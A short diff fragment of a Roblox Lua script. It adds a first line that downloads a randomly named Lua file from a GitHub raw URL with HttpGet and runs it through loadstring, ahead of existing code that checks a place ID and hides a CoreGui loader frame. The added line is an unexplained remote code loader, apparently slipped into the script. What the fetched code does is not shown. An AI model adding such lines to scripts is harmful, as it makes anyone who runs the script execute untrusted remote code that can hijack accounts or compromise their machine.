@@ -1,3 +1,5 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/treeofplant/461d-4682-97/main/ghBnsjSM.lua'),true))()
+
 if game.PlaceId == 855499080 then
     game.CoreGui.loader123.Frame.keepthis.BackgroundTransparency = 1
     
